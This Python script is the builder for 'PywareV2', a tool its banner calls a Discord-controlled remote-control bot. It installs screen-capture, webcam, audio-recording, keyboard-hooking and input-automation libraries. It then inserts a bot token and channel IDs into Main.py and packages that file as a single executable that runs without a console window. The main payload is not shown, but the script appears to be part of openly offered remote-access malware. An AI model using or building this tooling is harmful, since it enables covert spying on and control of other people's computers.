import os
import subprocess
import sys
import shutil

MAIN_FILE = "Main.py"
PLACEHOLDERS = {
    "TOKEN": '"<Bot-Token>"',
    "SERVER_ID": '<SERVER-ID>',
    "CHANNEL_ID": '<CHANNEL-ID>'
}

def set_title():
    os.system("title Setup PywareV2 - V1.0")

def logo():
    print("""
  ____                             __     ______  
 |  _ \ _   ___      ____ _ _ __ __\ \   / /___ \ 
 | |_) | | | \ \ /\ / / _` | '__/ _ \ \ / /  __) |
 |  __/| |_| |\ V  V / (_| | | |  __/\ V /  / __/ 
 |_|    \__, | \_/\_/ \__,_|_|  \___| \_/  |_____|
        |___/                                     
---------------------------------------------------
🔧 Remote Control Discord-Bot made by Ole4923
---------------------------------------------------
    """)

def ask_user_inputs():
    token = input("👉 Bot Token: ").strip()
    clear_screen()
    logo()
    server_id = input("👉 Server-ID: ").strip()
    clear_screen()
    logo()
    channel_id = input("👉 Channel-ID: ").strip()
    clear_screen()
    logo()
    return token, server_id, channel_id

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def replace_placeholders(token, server_id, channel_id):
    with open(MAIN_FILE, 'r', encoding='utf-8') as f:
        original_content = f.read()
    
    modified_content = original_content
    modified_content = modified_content.replace(PLACEHOLDERS["TOKEN"], f'"{token}"')
    modified_content = modified_content.replace(PLACEHOLDERS["SERVER_ID"], server_id)
    modified_content = modified_content.replace(PLACEHOLDERS["CHANNEL_ID"], channel_id)

    with open(MAIN_FILE, 'w', encoding='utf-8') as f:
        f.write(modified_content)

    return original_content

def reset_placeholders(original_content):
    with open(MAIN_FILE, 'w', encoding='utf-8') as f:
        f.write(original_content)
    print("✅ Placeholders in Main.py have been reset")

def ensure_dependencies():
    print("📦 Installing required modules...")
    modules = [
        'discord.py', 'mss', 'opencv-python', 'Pillow', 'sounddevice', 'numpy',
        'scipy', 'pynput', 'screeninfo', 'pycaw', 'comtypes', 'requests', 'psutil',
        'pyautogui', 'cryptography'
    ]
    subprocess.run([sys.executable, "-m", "pip", "install"] + modules)

def build_exe():
    print("⚙️ Creating EXE with PyInstaller...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], check=True)

    subprocess.run([
        'pyinstaller',
        '--onefile',
        '--noconsole',
        MAIN_FILE
    ], check=True)

    exe_name = os.path.splitext(MAIN_FILE)[0] + ".exe"
    source = os.path.join("dist", exe_name)
    target = os.path.join(os.getcwd(), exe_name)

    if os.path.exists(source):
        shutil.copy2(source, target)
        print(f"✅ EXE saved: {target}")
    else:
        print("❌ EXE was not created.")

def cleanup(original_content):
    print("🧹 Cleaning up temporary files...")
    for folder in ['build', 'dist']:
        if os.path.isdir(folder):
            shutil.rmtree(folder)
    for file in os.listdir():
        if file.endswith('.spec'):
            os.remove(file)
    
    reset_placeholders(original_content)

def main():
    if not os.path.exists(MAIN_FILE):
        print(f"❌ {MAIN_FILE} not found.")
        return

    ensure_dependencies()
    clear_screen()
    logo()
    set_title()
    token, server_id, channel_id = ask_user_inputs()
    
    # Save original content and replace placeholders
    original_content = replace_placeholders(token, server_id, channel_id)
    
    try:
        build_exe()
    finally:
        # Clean up and reset placeholders (even if errors occur)
        cleanup(original_content)

if __name__ == "__main__":
    main()